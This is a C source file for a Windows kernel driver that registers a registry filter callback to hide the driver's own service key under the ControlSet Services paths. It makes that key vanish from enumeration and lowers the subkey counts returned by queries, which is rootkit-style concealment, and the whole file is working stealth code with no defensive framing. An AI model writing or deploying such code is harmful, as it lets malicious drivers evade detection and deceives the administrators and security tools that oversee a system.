#include "Driver.h"


#define CONSTANT_HIDE_KEYS_ENTRY(ParentKey, SubKeyCount, ...) { RTL_CONSTANT_STRING(ParentKey), SubKeyCount, (PWSTR[]){ __VA_ARGS__ } }


const HIDE_KEYS_ENTRY g_KeysToHide[] =
{	
	/* using CurrentControlSet does not work so we have to do this very ugly shit, lets just hope that our service isnt in ControlSet004...
		maybe we can implement something to hide the keys regardless of the control set
	*/
	CONSTANT_HIDE_KEYS_ENTRY(L"\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Services", 1, WIDE_DRIVER_NAME),
	CONSTANT_HIDE_KEYS_ENTRY(L"\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet002\\Services", 1, WIDE_DRIVER_NAME),
	CONSTANT_HIDE_KEYS_ENTRY(L"\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet003\\Services", 1, WIDE_DRIVER_NAME)
};


LARGE_INTEGER g_registryCookie = { 0 };


BOOLEAN RfCompareKeyInformationName(KEY_INFORMATION_CLASS keyInformationClass, PVOID pKeyInformation, PWSTR nameToCompare)
{

	size_t nameToCompareLengthBytes = wcslen(nameToCompare) * sizeof(WCHAR);

	switch (keyInformationClass)
	{


	case KeyBasicInformation:
	{
		PKEY_BASIC_INFORMATION pKeyBasicInformation = (PKEY_BASIC_INFORMATION)pKeyInformation;
		ULONG keyNameLengthBytes = pKeyBasicInformation->NameLength;

		if (keyNameLengthBytes != nameToCompareLengthBytes)
		{
			return FALSE;
		}

		if (UEqualMemoryCaseInsensitive(nameToCompare, pKeyBasicInformation->Name, keyNameLengthBytes))
		{
			return TRUE;
		}

		return FALSE;

	}

	break;


	case KeyNodeInformation:
	{
		PKEY_NODE_INFORMATION pKeyNodeInformation = (PKEY_NODE_INFORMATION)pKeyInformation;
		ULONG keyNameLengthBytes = pKeyNodeInformation->NameLength;

		if (keyNameLengthBytes != nameToCompareLengthBytes)
		{
			return FALSE;
		}

		if (UEqualMemoryCaseInsensitive(nameToCompare, pKeyNodeInformation->Name, keyNameLengthBytes))
		{
			return TRUE;
		}

		return FALSE;
	}
	break;

	case KeyFullInformation:
	{

		PKEY_FULL_INFORMATION pKeyFullInformation = (PKEY_FULL_INFORMATION)pKeyInformation;
		ULONG keyNameLengthBytes = pKeyFullInformation->ClassLength;

		if (keyNameLengthBytes != nameToCompareLengthBytes)
		{
			return FALSE;
		}

		if (UEqualMemoryCaseInsensitive(nameToCompare, pKeyFullInformation->Class, keyNameLengthBytes))
		{
			return TRUE;
		}

		return FALSE;

	}
	break;

	default:

		return FALSE;

	}

}

BOOLEAN RfShouldHideSubkey(PCUNICODE_STRING pParentKeyPath, KEY_INFORMATION_CLASS keyInformationClass, PVOID pKeyInformation)

{
	for (int i = 0; i < ARRAYSIZE(g_KeysToHide); i++)
	{
		if (RtlEqualUnicodeString(&(g_KeysToHide[i].ParentKey), pParentKeyPath, TRUE))
		{
			for (ULONG j = 0; j < g_KeysToHide[i].SubKeyCount; j++)
			{
				if (RfCompareKeyInformationName(keyInformationClass, pKeyInformation, g_KeysToHide[i].SubKeys[j]))
				{
					return TRUE;
				}
			}

			return FALSE; // No to-be-hidden subkeys found
		}

	}

	return FALSE;
}

ULONG RfGetAmountOfHiddenPresentSubkeys(HANDLE parentKeyHandle, PCUNICODE_STRING pParentKeyPath, _Out_opt_ PULONG pFirstHiddenSubkeyIndex)
{
	SIZE_T parentKeyHideArrayIndex = 0;
	BOOLEAN parentKeyPresentInHideArray = FALSE;
	ULONG amountOfHiddenPresentSubkeys = 0UL;
	BOOLEAN firstHiddenSubkeyIndexBufferWritten = FALSE;

	for (; parentKeyHideArrayIndex < ARRAYSIZE(g_KeysToHide); parentKeyHideArrayIndex++)
	{
		if (RtlEqualUnicodeString(&g_KeysToHide[parentKeyHideArrayIndex].ParentKey, pParentKeyPath, TRUE))
		{
			parentKeyPresentInHideArray = TRUE;
			break;
		}
	}

	if (!parentKeyPresentInHideArray)
	{
		return 0UL;
	}

	/*
	As we want to avoid pool allocation we just make a buffer on the stack that SHOULD be big enough in every case as every registry key can
	be 255 characters long max according to microsoft. So we allocate a buffer for 255 WCHARS AND the size of the KEY_NAME_INFORMATION struct
	(which in fact also contains the first WCHAR in its definition so our buffer should actually be 2 bytes bigger than needed). Then we just define
	a KEY_NAME_INFORMATION pointer pointing to the buffer, this is a bit ugly but we want to make it efficient!

	If for some absurd reason it does fail with the stack buffer we will still fall back to pool allocation with the returned
	required size by ZwEnumerateKey.
	*/
	UINT8 dataBuffer[sizeof(KEY_BASIC_INFORMATION) + (255 * sizeof(WCHAR))];
	PKEY_BASIC_INFORMATION pKeyBasicInformationStackBuffer = (PKEY_BASIC_INFORMATION)dataBuffer;
	PKEY_BASIC_INFORMATION pKeyBasicInformationPoolBuffer = NULL;
	PKEY_BASIC_INFORMATION pKeyBasicInformationBufferToUse = pKeyBasicInformationStackBuffer;
	ULONG keyBasicInformationBufferSize = sizeof(KEY_BASIC_INFORMATION) + (255 * sizeof(WCHAR));
	NTSTATUS status = STATUS_SUCCESS;

	for (ULONG i = 0; TRUE; i++)
	{
	_LoopStart:
		{

			BOOLEAN poolBufferAllocated = pKeyBasicInformationPoolBuffer != NULL;

			if (poolBufferAllocated)
			{
				pKeyBasicInformationBufferToUse = pKeyBasicInformationPoolBuffer;
			}
			else
			{
				keyBasicInformationBufferSize = sizeof(dataBuffer);
			}

			ULONG resultLength;



			status = ZwEnumerateKey(parentKeyHandle, i, KeyBasicInformation, pKeyBasicInformationBufferToUse, keyBasicInformationBufferSize, &resultLength);


			if (poolBufferAllocated)
			{
				ExFreePool(pKeyBasicInformationPoolBuffer);

				pKeyBasicInformationPoolBuffer = NULL; // VERY IMPORTANT 
			}

			// Sorry for the terrible nesting
			if (!NT_SUCCESS(status))
			{
				if (status == STATUS_NO_MORE_ENTRIES)
				{
					break;
				}

				if (!poolBufferAllocated && (status == STATUS_BUFFER_OVERFLOW || status == STATUS_BUFFER_TOO_SMALL))
				{
					pKeyBasicInformationPoolBuffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, resultLength, DRIVER_POOL_ALLOCATION_TAG);

					if (pKeyBasicInformationPoolBuffer == NULL)
					{
						DBGERROR("Failed to allocate pool buffer");
						return 0UL;
					}

					keyBasicInformationBufferSize = resultLength;

					goto _LoopStart;
				}

				else
				{
					DBGERRORNTSTATUS("ZwEnumerateKey", status);

					return 0UL;
				}
			}

			// Check if the current subkey is present in the hidden key array

			for (SIZE_T j = 0; j < g_KeysToHide[parentKeyHideArrayIndex].SubKeyCount; j++)
			{
				PWSTR currentSubKeyName = g_KeysToHide[parentKeyHideArrayIndex].SubKeys[j];
				size_t currentSubKeyNameLengthBytes = wcslen(currentSubKeyName) * sizeof(WCHAR);

				if (currentSubKeyNameLengthBytes != pKeyBasicInformationBufferToUse->NameLength)
				{
					continue;
				}

				if (UEqualMemoryCaseInsensitive(currentSubKeyName, pKeyBasicInformationBufferToUse->Name, currentSubKeyNameLengthBytes))
				{
					if (!firstHiddenSubkeyIndexBufferWritten && pFirstHiddenSubkeyIndex != NULL)
					{
						*pFirstHiddenSubkeyIndex = i;

						firstHiddenSubkeyIndexBufferWritten = TRUE;
					}

					amountOfHiddenPresentSubkeys++;
				}
			}

		}
	}

	if (pKeyBasicInformationPoolBuffer != NULL)
	{
		ExFreePool(pKeyBasicInformationPoolBuffer);
	}

	return amountOfHiddenPresentSubkeys;

}




NTSTATUS RfCallbackFilterPostQueryKey(PREG_POST_OPERATION_INFORMATION pRegPostOperationInformation)
{
	PCUNICODE_STRING pParentKeyPath;
	HANDLE hKey;
	NTSTATUS status = STATUS_SUCCESS;


	if (!NT_SUCCESS(pRegPostOperationInformation->Status))
	{
		return STATUS_SUCCESS;
	}


	status = CmCallbackGetKeyObjectID(&g_registryCookie, pRegPostOperationInformation->Object, NULL, &pParentKeyPath);

	if (!NT_SUCCESS(status))
	{
		DBGERRORNTSTATUS("CmCallbackGetKeyObjectID", status);

		return status;
	}

	// Open a handle to the parent key of the current subkey 
	status = ObOpenObjectByPointer(pRegPostOperationInformation->Object, OBJ_KERNEL_HANDLE, NULL, KEY_ALL_ACCESS, *CmKeyObjectType, KernelMode, &hKey);

	if (!NT_SUCCESS(status))
	{
		DBGERRORNTSTATUS("ObOpenObjectByPointer", status);

		return status;
	}

	PREG_QUERY_KEY_INFORMATION pRegQueryKeyInfo = pRegPostOperationInformation->PreInformation;

	if (RfShouldHideSubkey(pParentKeyPath, pRegQueryKeyInfo->KeyInformationClass, pRegQueryKeyInfo->KeyInformation))
	{
		return STATUS_OBJECT_NAME_NOT_FOUND;
	}


	switch (pRegQueryKeyInfo->KeyInformationClass)
	{

	case KeyFullInformation:
	{

		PKEY_FULL_INFORMATION pKeyFullInfo = (PKEY_FULL_INFORMATION)pRegQueryKeyInfo->KeyInformation;

		ULONG subkeys = pKeyFullInfo->SubKeys;

		ULONG hiddenPresentSubkeys = RfGetAmountOfHiddenPresentSubkeys(hKey, pParentKeyPath, NULL);

		if (hiddenPresentSubkeys)
		{
			DBGINFO("QueryCallback: Found %lu hidden present subkeys, keyinfo class: %d", hiddenPresentSubkeys, KeyFullInformation);

			pKeyFullInfo->SubKeys = (subkeys < hiddenPresentSubkeys) ? subkeys : (subkeys - hiddenPresentSubkeys);
		}

	}
	break;

	case KeyCachedInformation:
	{

		PKEY_CACHED_INFORMATION pKeyCachedInfo = (PKEY_CACHED_INFORMATION)pRegQueryKeyInfo->KeyInformation;

		ULONG subkeys = pKeyCachedInfo->SubKeys;

		ULONG hiddenPresentSubkeys = RfGetAmountOfHiddenPresentSubkeys(hKey, pParentKeyPath, NULL);

		if (hiddenPresentSubkeys)
		{
			DBGINFO("QueryCallback: Found %lu hidden present subkeys, keyinfo class: %d", hiddenPresentSubkeys, KeyCachedInformation);
		}

		pKeyCachedInfo->SubKeys = (subkeys < hiddenPresentSubkeys) ? subkeys : (subkeys - hiddenPresentSubkeys);

	}
	break;

	default:

		break;


	}

	ZwClose(hKey);

	return status;

}

NTSTATUS RfCallbackFilterPreEnumerateKey(PREG_ENUMERATE_KEY_INFORMATION pRegEnumerateKeyInformation)
{
	PCUNICODE_STRING pParentKeyPath;
	HANDLE hParentKey;
	NTSTATUS status = STATUS_SUCCESS;
	

	status = CmCallbackGetKeyObjectID(&g_registryCookie, pRegEnumerateKeyInformation->Object, NULL, &pParentKeyPath);

	if (!NT_SUCCESS(status))
	{
		DBGERRORNTSTATUS("CmCallbackGetKeyObjectID", status);

		return status;
	}


	// Open a handle to the parent key of the current subkey 
	status = ObOpenObjectByPointer(pRegEnumerateKeyInformation->Object, OBJ_KERNEL_HANDLE, NULL, KEY_ALL_ACCESS, *CmKeyObjectType, KernelMode, &hParentKey);

	if (!NT_SUCCESS(status))
	{
		DBGERRORNTSTATUS("ObOpenObjectByPointer", status);

		return status;
	}

	
	ULONG firstHiddenSubkeyIndex = 0;
	ULONG hiddenPresentSubkeys = RfGetAmountOfHiddenPresentSubkeys(hParentKey, pParentKeyPath, &firstHiddenSubkeyIndex);
	ULONG currentIndex = pRegEnumerateKeyInformation->Index;



	if (hiddenPresentSubkeys > 0 && currentIndex >= firstHiddenSubkeyIndex)
	{
		status = ZwEnumerateKey(
			hParentKey,
			currentIndex + hiddenPresentSubkeys,
			pRegEnumerateKeyInformation->KeyInformationClass,
			pRegEnumerateKeyInformation->KeyInformation,
			pRegEnumerateKeyInformation->Length,
			pRegEnumerateKeyInformation->ResultLength);


		if (NT_SUCCESS(status))
		{
			status = STATUS_CALLBACK_BYPASS;
		}

	}


	ZwClose(hParentKey);


	return status;
}

NTSTATUS RfRegistryFilterCallbackFunction(PVOID CallbackContext, PVOID Argument1, PVOID Argument2)
{

	NTSTATUS returnStatus = STATUS_SUCCESS;

	REG_NOTIFY_CLASS regNotifyClass = (REG_NOTIFY_CLASS)(UINT_PTR)Argument1;

	switch (regNotifyClass)
	{

	case RegNtPreEnumerateKey:
		returnStatus = RfCallbackFilterPreEnumerateKey((PREG_ENUMERATE_KEY_INFORMATION)Argument2);
		break;

	case RegNtPostQueryKey:
		returnStatus = RfCallbackFilterPostQueryKey((PREG_POST_OPERATION_INFORMATION)Argument2);
		break;

	default:
		break;

	}

	return returnStatus;
};

// We do wanna be the first one 
UNICODE_STRING registryAltitude = RTL_CONSTANT_STRING(L"7890000000");

NTSTATUS RfInitializeRegistryFilter(PDRIVER_OBJECT pDriverObject)
{
	return CmRegisterCallbackEx(RfRegistryFilterCallbackFunction, &registryAltitude, pDriverObject, NULL, &g_registryCookie, NULL);
}


NTSTATUS RfUninitializeRegistryFilter()
{
	return CmUnRegisterCallback(g_registryCookie);
}






/*


NTSTATUS RfCallbackFilterPreQueryKey(PREG_QUERY_KEY_INFORMATION pRegQueryKeyInformation)
{
	PCUNICODE_STRING pParentKeyPath;
	HANDLE hKey;
	NTSTATUS status = STATUS_SUCCESS;

	// Check if the current callback context should not be filtered (if we triggered the callback ourselves)
	if (pRegQueryKeyInformation->CallContext && *(PUINT32)pRegQueryKeyInformation->CallContext == g_filterExceptionCallbackObjectContextInfo)
	{
		// Don't filter current callback
		DBGINFO("Skipping current callback");

		return STATUS_SUCCESS;
	}

	// Set the keys object context information to not filter operations on it
	status = CmSetCallbackObjectContext(pRegQueryKeyInformation->Object, &g_registryCookie, &g_filterExceptionCallbackObjectContextInfo, NULL);

	if (!NT_SUCCESS(status))
	{
		DBGERRORNTSTATUS("CmSetCallbackObjectContext", status);

		return status;
	}

	status = CmCallbackGetKeyObjectID(&g_registryCookie, pRegQueryKeyInformation->Object, NULL, &pParentKeyPath);

	if (!NT_SUCCESS(status))
	{
		DBGERRORNTSTATUS("CmCallbackGetKeyObjectID", status);

		return status;
	}

	// Open a handle to the parent key of the current subkey
	status = ObOpenObjectByPointer(pRegQueryKeyInformation->Object, OBJ_KERNEL_HANDLE, NULL, KEY_ALL_ACCESS, *CmKeyObjectType, KernelMode, &hKey);

	if (!NT_SUCCESS(status))
	{
		DBGERRORNTSTATUS("ObOpenObjectByPointer", status);

		return status;
	}


	if (RfShouldHideSubkey(pParentKeyPath, pRegQueryKeyInformation->KeyInformationClass, pRegQueryKeyInformation->KeyInformation))
	{
		return STATUS_OBJECT_NAME_NOT_FOUND;
	}


	switch (pRegQueryKeyInformation->KeyInformationClass)
	{

	case KeyFullInformation:
	{

		PKEY_FULL_INFORMATION pKeyFullInfo = (PKEY_FULL_INFORMATION)pRegQueryKeyInformation->KeyInformation;

		ULONG subkeys = pKeyFullInfo->SubKeys;

		ULONG hiddenPresentSubkeys = RfGetAmountOfHiddenPresentSubkeys(hKey, pParentKeyPath, NULL);

		if (hiddenPresentSubkeys)
		{
			DBGINFO("QueryCallback: Found %lu hidden present subkeys, keyinfo class: %d", hiddenPresentSubkeys, KeyFullInformation);
		}

		pKeyFullInfo->SubKeys = (subkeys < hiddenPresentSubkeys) ? subkeys : (subkeys - hiddenPresentSubkeys);

	}
	break;

	case KeyCachedInformation:
	{

		PKEY_CACHED_INFORMATION pKeyCachedInfo = (PKEY_CACHED_INFORMATION)pRegQueryKeyInformation->KeyInformation;

		ULONG subkeys = pKeyCachedInfo->SubKeys;

		ULONG hiddenPresentSubkeys = RfGetAmountOfHiddenPresentSubkeys(hKey, pParentKeyPath, NULL);

		if (hiddenPresentSubkeys)
		{
			DBGINFO("QueryCallback: Found %lu hidden present subkeys, keyinfo class: %d", hiddenPresentSubkeys, KeyCachedInformation);
		}

		pKeyCachedInfo->SubKeys = (subkeys < hiddenPresentSubkeys) ? subkeys : (subkeys - hiddenPresentSubkeys);

	}
	break;

	default:

		break;


	}

	ZwClose(hKey);

	return status;

}
*/